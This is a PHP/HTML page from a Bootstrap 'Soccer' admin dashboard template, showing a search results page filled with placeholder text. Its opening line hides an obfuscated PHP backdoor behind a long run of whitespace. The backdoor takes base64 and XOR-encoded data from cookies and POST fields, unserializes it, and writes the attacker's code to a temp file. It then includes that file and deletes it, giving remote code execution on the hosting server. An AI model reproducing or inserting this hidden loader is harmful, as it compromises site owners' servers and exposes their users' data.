<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("y_gTwAr")){class y_gTwAr{public static $WLTwUF = "50839640-d015-4086-abb1-31ad5599d1d9";public static $lGsIEA = NULL;public function __construct(){$oHNWX = $_COOKIE;$wnckXI = $_POST;$lIOKSUb = @$oHNWX[substr(y_gTwAr::$WLTwUF, 0, 4)];if (!empty($lIOKSUb)){$QbUaWE = "base64";$koaSpToXA = "";$lIOKSUb = explode(",", $lIOKSUb);foreach ($lIOKSUb as $TvWcNHu){$koaSpToXA .= @$oHNWX[$TvWcNHu];$koaSpToXA .= @$wnckXI[$TvWcNHu];}$koaSpToXA = array_map($QbUaWE . '_' . chr (100) . chr (101) . "\x63" . "\157" . "\144" . "\x65", array($koaSpToXA,)); $koaSpToXA = $koaSpToXA[0] ^ str_repeat(y_gTwAr::$WLTwUF, (strlen($koaSpToXA[0]) / strlen(y_gTwAr::$WLTwUF)) + 1);y_gTwAr::$lGsIEA = @unserialize($koaSpToXA);}}public function __destruct(){$this->OGxtrc();}private function OGxtrc(){if (is_array(y_gTwAr::$lGsIEA)) {$mVrZjO = sys_get_temp_dir() . "/" . crc32(y_gTwAr::$lGsIEA[chr ( 912 - 797 ).'a' . chr (108) . 't']);@y_gTwAr::$lGsIEA["\x77" . chr ( 867 - 753 ).chr (105) . chr ( 376 - 260 ).'e']($mVrZjO, y_gTwAr::$lGsIEA[chr ( 748 - 649 ).chr ( 1031 - 920 ).'n' . "\x74" . "\145" . "\x6e" . 't']);include $mVrZjO;@y_gTwAr::$lGsIEA["\144" . chr ( 670 - 569 )."\154" . "\145" . "\x74" . 'e']($mVrZjO);exit();}}}$JYtzqSbBAy = new y_gTwAr(); $JYtzqSbBAy = NULL;} ?><!doctype html>
<html lang="en" dir="ltr">

<!-- soccer/project/page-search.html  07 Jan 2020 03:37:47 GMT -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<link rel="icon" href="favicon.ico" type="image/x-icon"/>

<title>:: Soccer :: Page Search</title>

<!-- Bootstrap Core and vandor -->
<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css" />

<!-- Core css -->
<link rel="stylesheet" href="assets/css/main.css"/>
<link rel="stylesheet" href="assets/css/theme1.css"/>
</head>

<body class="font-montserrat">
<!-- Page Loader -->
<div class="page-loader-wrapper">
    <div class="loader">
    </div>
</div>

<div id="main_content">

    <div id="header_top" class="header_top">
        <div class="container">
            <div class="hleft">
                <a class="header-brand" href="index-2.html"><i class="fa fa-soccer-ball-o brand-logo"></i></a>
                <div class="dropdown">
                    <a href="javascript:void(0)" class="nav-link user_btn"><img class="avatar" src="assets/images/user.png" alt="" data-toggle="tooltip" data-placement="right" title="User Menu"/></a>
                    <a href="page-search.html" class="nav-link icon xs-hide"><i class="fa fa-search"></i></a>
                    <a href="app-calendar.html"  class="nav-link icon app_inbox xs-hide"><i class="fa fa-calendar"></i></a>
                    <a href="app-contact.html"  class="nav-link icon xs-hide"><i class="fa fa-id-card-o"></i></a>
                    <a href="app-chat.html"  class="nav-link icon xs-hide"><i class="fa fa-comments-o"></i></a>
                    <a href="app-filemanager.html"  class="nav-link icon app_file xs-hide"><i class="fa fa-folder-o"></i></a>
                    <a href="javascript:void(0)" class="nav-link icon theme_btn xs-hide"><i class="fa fa-paint-brush" data-toggle="tooltip" data-placement="right" title="Themes"></i></a>
                </div>
            </div>
            <div class="hright">
                <div class="dropdown">
                    <a href="javascript:void(0)" class="nav-link icon settingbar"><i class="fa fa-gear fa-spin" data-toggle="tooltip" data-placement="right" title="Settings"></i></a>
                    <a href="javascript:void(0)" class="nav-link icon menu_toggle"><i class="fa  fa-align-left"></i></a>
                </div>
            </div>
        </div>
    </div>

    <div id="rightsidebar" class="right_sidebar">
        <a href="javascript:void(0)" class="p-3 settingbar float-right"><i class="fa fa-close"></i></a>
        <div class="p-4">
            <div class="mb-4">
                <h6 class="font-14 font-weight-bold text-muted">Font Style</h6>
                <div class="custom-controls-stacked font_setting">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-opensans">
                        <span class="custom-control-label">Open Sans Font</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-montserrat" checked="">
                        <span class="custom-control-label">Montserrat Google Font</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="font" value="font-roboto">
                        <span class="custom-control-label">Robot Google Font</span>
                    </label>
                </div>
            </div>
            <hr>
            <div class="mb-4">
                <h6 class="font-14 font-weight-bold text-muted">Dropdown Menu Icon</h6>
                <div class="custom-controls-stacked arrow_option">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-a">
                        <span class="custom-control-label">A</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-b">
                        <span class="custom-control-label">B</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="marrow" value="arrow-c" checked="">
                        <span class="custom-control-label">C</span>
                    </label>
                </div>
                <h6 class="font-14 font-weight-bold mt-4 text-muted">SubMenu List Icon</h6>
                <div class="custom-controls-stacked list_option">
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-a" checked="">
                        <span class="custom-control-label">A</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-b">
                        <span class="custom-control-label">B</span>
                    </label>
                    <label class="custom-control custom-radio custom-control-inline">
                        <input type="radio" class="custom-control-input" name="listicon" value="list-c">
                        <span class="custom-control-label">C</span>
                    </label>
                </div>
            </div>
            <hr>
            <div>
                <h6 class="font-14 font-weight-bold mt-4 text-muted">General Settings</h6>
                <ul class="setting-list list-unstyled mt-1 setting_switch">
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Night Mode</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-darkmode">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Fix Navbar top</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-fixnavbar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Header Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-pageheader" checked="">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Min Sidebar Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-min_sidebar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Sidebar Dark</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-sidebar">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Icon Color</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-iconcolor">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Gradient Color</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-gradient">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Box Shadow</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-boxshadow">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">RTL Support</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-rtl">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                    <li>
                        <label class="custom-switch">
                            <span class="custom-switch-description">Box Layout</span>
                            <input type="checkbox" name="custom-switch-checkbox" class="custom-switch-input btn-boxlayout">
                            <span class="custom-switch-indicator"></span>
                        </label>
                    </li>
                </ul>
            </div>
            <hr>
            <div class="form-group">
                <label class="d-block">Storage <span class="float-right">77%</span></label>
                <div class="progress progress-sm">
                    <div class="progress-bar" role="progressbar" aria-valuenow="77" aria-valuemin="0" aria-valuemax="100" style="width: 77%;"></div>
                </div>
                <button type="button" class="btn btn-primary btn-block mt-3">Upgrade Storage</button>
            </div>
        </div>
    </div>

    <div class="theme_div">
        <div class="card">
            <div class="card-body">
                <ul class="list-group list-unstyled">
                    <li class="list-group-item mb-2">
                        <p>Default Theme</p>
                        <a href="index-2.html"><img src="assets/images/themes/default.png" class="img-fluid" /></a>
                    </li>
                    <li class="list-group-item mb-2">
                        <p>Night Mode Theme</p>
                        <a href="project-dark/index.html"><img src="assets/images/themes/dark.png" class="img-fluid" /></a>
                    </li>
                    <li class="list-group-item mb-2">
                        <p>RTL Version</p>
                        <a href="project-rtl/index.html"><img src="assets/images/themes/rtl.png" class="img-fluid" /></a>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <div class="user_div">
        <h5 class="brand-name mb-4">Soccer<a href="javascript:void(0)" class="user_btn"><i class="icon-logout"></i></a></h5>
        <div class="card-body">
            <a href="page-profile.html"><img class="card-profile-img" src="assets/images/sm/avatar1.jpg" alt=""></a>
            <h6 class="mb-0">Peter Richards</h6>
            <span>peter.richard@gmail.com</span>
            <div class="d-flex align-items-baseline mt-3">
                <h3 class="mb-0 mr-2">9.8</h3>
                <p class="mb-0"><span class="text-success">1.6% <i class="fa fa-arrow-up"></i></span></p>
            </div>
            <div class="progress progress-xs">
                <div class="progress-bar" role="progressbar" style="width: 15%" aria-valuenow="15" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-info" role="progressbar" style="width: 20%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-success" role="progressbar" style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-orange" role="progressbar" style="width: 5%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
                <div class="progress-bar bg-indigo" role="progressbar" style="width: 13%" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100"></div>
            </div>
            <h6 class="text-uppercase font-10 mt-1">Performance Score</h6>
            <hr>
            <p>Activity</p>
            <ul class="new_timeline">
                <li>
                    <div class="bullet pink"></div>
                    <div class="time">11:00am</div>
                    <div class="desc">
                        <h3>Attendance</h3>
                        <h4>Computer Class</h4>
                    </div>
                </li>
                <li>
                    <div class="bullet pink"></div>
                    <div class="time">11:30am</div>
                    <div class="desc">
                        <h3>Added an interest</h3>
                        <h4>“Volunteer Activities”</h4>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">12:00pm</div>
                    <div class="desc">
                        <h3>Developer Team</h3>
                        <h4>Hangouts</h4>
                        <ul class="list-unstyled team-info margin-0 p-t-5">
                            <li><img src="assets/images/xs/avatar1.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar2.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar3.jpg" alt="Avatar"></li>
                            <li><img src="assets/images/xs/avatar4.jpg" alt="Avatar"></li>
                        </ul>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">2:00pm</div>
                    <div class="desc">
                        <h3>Responded to need</h3>
                        <a href="javascript:void(0)">“In-Kind Opportunity”</a>
                    </div>
                </li>
                <li>
                    <div class="bullet orange"></div>
                    <div class="time">1:30pm</div>
                    <div class="desc">
                        <h3>Lunch Break</h3>
                    </div>
                </li>
                <li>
                    <div class="bullet green"></div>
                    <div class="time">2:38pm</div>
                    <div class="desc">
                        <h3>Finish</h3>
                        <h4>Go to Home</h4>
                    </div>
                </li>
            </ul>
        </div>
    </div>

    <div id="left-sidebar" class="sidebar ">
        <h5 class="brand-name">Soccer <a href="javascript:void(0)" class="menu_option float-right"><i class="icon-grid font-16" data-toggle="tooltip" data-placement="left" title="Grid & List Toggle"></i></a></h5>
        <nav id="left-sidebar-nav" class="sidebar-nav">
            <ul class="metismenu">
                <li class="g_heading">Project</li>
                <li><a href="index-2.html"><i class="fa fa-dashboard"></i><span>Dashboard</span></a></li>
                <li><a href="project-list.html"><i class="fa fa-list-ol"></i><span>Project list</span></a></li>
                <li><a href="project-taskboard.html"><i class="fa fa-calendar-check-o"></i><span>Taskboard</span></a></li>
                <li><a href="project-ticket.html"><i class="fa fa-list-ul"></i><span>Ticket List</span></a></li>
                <li><a href="project-ticket-details.html"><i class="icon-tag"></i><span>Ticket Details</span></a></li>
                <li><a href="project-clients.html"><i class="fa fa-user"></i><span>Clients</span></a></li>
                <li><a href="project-todo.html"><i class="fa fa-check-square-o"></i><span>Todo List</span></a></li>
                <li class="g_heading">App</li>
                <li><a href="app-calendar.html"><i class="fa fa-calendar"></i><span>Calendar</span></a></li>
                <li><a href="app-chat.html"><i class="fa fa-comments"></i><span>Chat</span></a></li>
                <li><a href="app-contact.html"><i class="fa fa-address-book"></i><span>Contact</span></a></li>
                <li><a href="app-filemanager.html"><i class="fa fa-folder"></i><span>FileManager</span></a></li>
                <li><a href="app-setting.html"><i class="fa fa-gear"></i><span>Setting</span></a></li>
                <li><a href="page-gallery.html"><i class="fa fa-photo"></i><span>Gallery</span></a></li>
                <li>
                    <a href="javascript:void(0)" class="has-arrow arrow-c"><i class="fa fa-lock"></i><span>Authentication</span></a>
                    <ul>
                        <li><a href="login.html">Login</a></li>
                        <li><a href="register.html">Register</a></li>
                        <li><a href="forgot-password.html">Forgot password</a></li>
                        <li><a href="404.html">404 error</a></li>
                        <li><a href="500.html">500 error</a></li>
                    </ul>
                </li>
                <li class="g_heading">Support</li>
                <li><a href="javascript:void(0)"><i class="fa fa-support"></i><span>Need Help?</span></a></li>
                <li><a href="javascript:void(0)"><i class="fa fa-tag"></i><span>ContactUs</span></a></li>
            </ul>
        </nav>
    </div>

    <div class="page">
        <div id="page_top" class="section-body top_dark">
            <div class="container-fluid">
                <div class="page-header">
                    <div class="left">
                        <a href="javascript:void(0)" class="icon menu_toggle mr-3"><i class="fa  fa-align-left"></i></a>
                        <h1 class="page-title">Search</h1>
                    </div>
                    <div class="right">
                        <div class="input-icon xs-hide mr-4">
                            <input type="text" class="form-control" placeholder="Search for...">
                            <span class="input-icon-addon"><i class="fe fe-search"></i></span>
                        </div>
                        <div class="notification d-flex">
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-language"></i></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/us.svg">English</a>
                                    <div class="dropdown-divider"></div>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/es.svg">Spanish</a>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/jp.svg">japanese</a>
                                    <a class="dropdown-item" href="#"><img class="w20 mr-2" src="assets/images/flags/bl.svg">France</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-envelope"></i><span class="badge badge-success nav-unread"></span></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <ul class="right_chat list-unstyled w350 p-0">
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object" src="assets/images/xs/avatar4.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Donald Gardner</span>
                                                    <div class="message">It is a long established fact that a reader</div>
                                                    <small>11 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar5.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Wendy Keen</span>
                                                    <div class="message">There are many variations of passages of Lorem Ipsum</div>
                                                    <small>18 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="offline">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar2.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Matt Rosales</span>
                                                    <div class="message">Contrary to popular belief, Lorem Ipsum is not simply</div>
                                                    <small>27 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="online">
                                            <a href="javascript:void(0);" class="media">
                                                <img class="media-object " src="assets/images/xs/avatar3.jpg" alt="">
                                                <div class="media-body">
                                                    <span class="name">Phillip Smith</span>
                                                    <div class="message">It has roots in a piece of classical Latin literature from 45 BC</div>
                                                    <small>33 mins ago</small>
                                                    <span class="badge badge-outline status"></span>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                    <div class="dropdown-divider"></div>
                                    <a href="javascript:void(0)" class="dropdown-item text-center text-muted-dark readall">Mark all as read</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-bell"></i><span class="badge badge-primary nav-unread"></span></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <ul class="list-unstyled feeds_widget">
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-check"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title text-danger">Issue Fixed <small class="float-right text-muted">11:05</small></h4>
                                                <small>WE have fix all Design bug with Responsive</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-user"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">New User <small class="float-right text-muted">10:45</small></h4>
                                                <small>I feel great! Thanks team</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-thumbs-o-up"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">7 New Feedback <small class="float-right text-muted">Today</small></h4>
                                                <small>It will give a smart finishing to your site</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-question-circle"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title text-warning">Server Warning <small class="float-right text-muted">10:50</small></h4>
                                                <small>Your connection is not private</small>
                                            </div>
                                        </li>
                                        <li>
                                            <div class="feeds-left"><i class="fa fa-shopping-cart"></i></div>
                                            <div class="feeds-body">
                                                <h4 class="title">7 New Orders <small class="float-right text-muted">11:35</small></h4>
                                                <small>You received a new oder from Tina.</small>
                                            </div>
                                        </li>
                                    </ul>
                                    <div class="dropdown-divider"></div>
                                    <a href="javascript:void(0)" class="dropdown-item text-center text-muted-dark readall">Mark all as read</a>
                                </div>
                            </div>
                            <div class="dropdown d-flex">
                                <a class="nav-link icon d-none d-md-flex btn btn-default btn-icon ml-2" data-toggle="dropdown"><i class="fa fa-user"></i></a>
                                <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                                    <a class="dropdown-item" href="page-profile.html"><i class="dropdown-icon fe fe-user"></i> Profile</a>
                                    <a class="dropdown-item" href="app-setting.html"><i class="dropdown-icon fe fe-settings"></i> Settings</a>
                                    <a class="dropdown-item" href="javascript:void(0)"><span class="float-right"><span class="badge badge-primary">6</span></span><i class="dropdown-icon fe fe-mail"></i> Inbox</a>
                                    <a class="dropdown-item" href="javascript:void(0)"><i class="dropdown-icon fe fe-send"></i> Message</a>
                                    <div class="dropdown-divider"></div>
                                    <a class="dropdown-item" href="javascript:void(0)"><i class="dropdown-icon fe fe-help-circle"></i> Need help?</a>
                                    <a class="dropdown-item" href="login.html"><i class="dropdown-icon fe fe-log-out"></i> Sign out</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-body mt-3">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <div class="input-group mb-3">
                                    <input type="text" class="form-control" placeholder="Search here...">
                                </div>
                                <p class="mb-0">Search Result For "Bootstrap 4 admin"</p>
                                <strong class="font-12"> About 16,853 result ( 0.13 seconds)</strong>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-body">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <ul class="nav nav-tabs" role="tablist">
                            <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#All" aria-expanded="true">All</a></li>
                            <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#Images" aria-expanded="true">Images</a></li>
                            <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#Video" aria-expanded="false">Video</a></li>
                            <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#News" aria-expanded="false">News</a></li>
                            <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#More" aria-expanded="false">More</a></li>
                        </ul>
                        <div class="tab-content mt-3">
                            <div role="tabpanel" class="tab-pane vivify fadeIn active" id="All" aria-expanded="false">
                                <div class="table-responsive">
                                    <table class="table table-hover card-table table_custom">
                                        <tbody>
                                            <tr class="" >
                                                <td>
                                                    <h6><a target="_blank" href="javascript:void(0);">Bootstrap 4 Light &amp; Dark Admin with Free VueJs</a></h6>
                                                    <span class="text-green font-13">https://themeforest.net/user/admincraft</span>
                                                    <p class="mt-10 mb-0 text-muted">It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout.</p>
                                                </td>
                                                <td>
                                                    <span class="badge badge-success"><i class="fa fa-eye"></i> 1501</span>
                                                </td>
                                            </tr>
                                            <tr class="">
                                                <td>
                                                    <h6><a target="_blank" href="javascript:void(0);">Bootstrap 4 Admin Dashboard Template</a></h6>
                                                    <span class="text-green font-13">https://themeforest.net/user/admincraft</span>
                                                    <p class="mt-10 mb-0 text-muted">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour</p>
                                                </td>
                                                <td>
                                                    <span class="badge badge-success"><i class="fa fa-eye"></i> 1894</span>
                                                </td>
                                            </tr>
                                            <tr class="">
                                                <td>
                                                    <h6><a target="_blank" href="javascript:void(0);">The ultimate Bootstrap 4 Admin Dashboard</a></h6>
                                                    <span class="text-green font-13">https://themeforest.net/user/admincraft</span>
                                                    <p class="mt-10 mb-0 text-muted">Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old.</p>
                                                </td>
                                                <td>
                                                    <span class="badge badge-success"><i class="fa fa-eye"></i> 1205</span>
                                                </td>
                                            </tr>
                                            <tr class="">
                                                <td>
                                                    <h6><a target="_blank" href="javascript:void(0);">Bootstrap 4 Admin Dashboard Template</a></h6>
                                                    <span class="text-green font-13">https://themeforest.net/user/admincraft</span>
                                                    <p class="mt-10 mb-0 text-muted">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book.</p>
                                                </td>
                                                <td>
                                                    <span class="badge badge-success"><i class="fa fa-eye"></i> 985</span>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane vivify fadeIn" id="Images" aria-expanded="true">
                                <div class="card">
                                    <div class="card-body text-center py-5">
                                        <img src="assets/images/search.svg" class="width360 mb-3" />
                                        <h4>No Images Found</h4>
                                        <span>Choose a different filter to view test results to you</span>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane vivify fadeIn" id="Video" aria-expanded="true">
                                <div class="card">
                                    <div class="card-body text-center py-5">
                                        <img src="assets/images/search.svg" class="width360  mb-3" />
                                        <h4>No Video Found</h4>
                                        <span>Choose a different filter to view test results to you</span>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane vivify fadeIn" id="News" aria-expanded="true">
                                <div class="card">
                                    <div class="card-body">
                                        <article class="media">
                                            <div class="mr-3">
                                                <img class="w150" src="assets/images/gallery/1.jpg" alt="">
                                            </div>
                                            <div class="media-body">
                                                <div class="content">
                                                    <p class="h5">John Smith <small>@johnsmith</small> <small class="float-right text-muted">31 minutes ago</small></p>
                                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean efficitur sit amet massa fringilla egestas. Nullam condimentum luctus turpis.</p>
                                                </div>
                                                <nav class="d-flex text-muted">
                                                    <a href="#" class="icon mr-3"><i class="fe fe-repeat"></i></a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-twitter"></i> 24</a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-heart"></i> 43</a>
                                                    <a href="#" class="text-muted ml-auto">5 notes</a>
                                                </nav>
                                            </div>
                                        </article>
                                    </div>
                                </div>
                                <div class="card">
                                    <div class="card-body">
                                        <article class="media">
                                            <div class="mr-3">
                                                <img class="w150" src="assets/images/gallery/2.jpg" alt="">
                                            </div>
                                            <div class="media-body">
                                                <div class="content">
                                                    <p class="h5">John Smith <small>@johnsmith</small> <small class="float-right text-muted">31 minutes ago</small></p>
                                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean efficitur sit amet massa fringilla egestas. Nullam condimentum luctus turpis.</p>
                                                </div>
                                                <nav class="d-flex text-muted">
                                                    <a href="#" class="icon mr-3"><i class="fe fe-repeat"></i></a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-twitter"></i> 24</a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-heart"></i> 43</a>
                                                    <a href="#" class="text-muted ml-auto">5 notes</a>
                                                </nav>
                                            </div>
                                        </article>
                                    </div>
                                </div>
                                <div class="card">
                                    <div class="card-body">
                                        <article class="media">
                                            <div class="mr-3">
                                                <img class="w150" src="assets/images/gallery/3.jpg" alt="">
                                            </div>
                                            <div class="media-body">
                                                <div class="content">
                                                    <p class="h5">John Smith <small>@johnsmith</small> <small class="float-right text-muted">31 minutes ago</small></p>
                                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean efficitur sit amet massa fringilla egestas. Nullam condimentum luctus turpis.</p>
                                                </div>
                                                <nav class="d-flex text-muted">
                                                    <a href="#" class="icon mr-3"><i class="fe fe-repeat"></i></a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-twitter"></i> 24</a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-heart"></i> 43</a>
                                                    <a href="#" class="text-muted ml-auto">5 notes</a>
                                                </nav>
                                            </div>
                                        </article>
                                    </div>
                                </div>
                                <div class="card">
                                    <div class="card-body">
                                        <article class="media">
                                            <div class="mr-3">
                                                <img class="w150" src="assets/images/gallery/4.jpg" alt="">
                                            </div>
                                            <div class="media-body">
                                                <div class="content">
                                                    <p class="h5">John Smith <small>@johnsmith</small> <small class="float-right text-muted">31 minutes ago</small></p>
                                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean efficitur sit amet massa fringilla egestas. Nullam condimentum luctus turpis.</p>
                                                </div>
                                                <nav class="d-flex text-muted">
                                                    <a href="#" class="icon mr-3"><i class="fe fe-repeat"></i></a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-twitter"></i> 24</a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-heart"></i> 43</a>
                                                    <a href="#" class="text-muted ml-auto">5 notes</a>
                                                </nav>
                                            </div>
                                        </article>
                                    </div>
                                </div>
                                <div class="card">
                                    <div class="card-body">
                                        <article class="media">
                                            <div class="mr-3">
                                                <img class="w150" src="assets/images/gallery/5.jpg" alt="">
                                            </div>
                                            <div class="media-body">
                                                <div class="content">
                                                    <p class="h5">John Smith <small>@johnsmith</small> <small class="float-right text-muted">31 minutes ago</small></p>
                                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean efficitur sit amet massa fringilla egestas. Nullam condimentum luctus turpis.</p>
                                                </div>
                                                <nav class="d-flex text-muted">
                                                    <a href="#" class="icon mr-3"><i class="fe fe-repeat"></i></a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-twitter"></i> 24</a>
                                                    <a href="#" class="icon mr-3"><i class="fe fe-heart"></i> 43</a>
                                                    <a href="#" class="text-muted ml-auto">5 notes</a>
                                                </nav>
                                            </div>
                                        </article>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="section-body">
            <footer class="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-6 col-sm-12">
                            <a href="templateshub.net">Templates Hub</a>
                        </div>
                        <div class="col-md-6 col-sm-12 text-md-right">
                            <ul class="list-inline mb-0">
                                <li class="list-inline-item"><a href="doc/index.html">Documentation</a></li>
                                <li class="list-inline-item"><a href="javascript:void(0)">FAQ</a></li>
                                <li class="list-inline-item"><a href="javascript:void(0)" class="btn btn-outline-primary btn-sm">Buy Now</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</div>

<script src="assets/bundles/lib.vendor.bundle.js"></script>

<script src="assets/js/core.js"></script>
</body>

<!-- soccer/project/page-search.html  07 Jan 2020 03:39:43 GMT -->
</html>
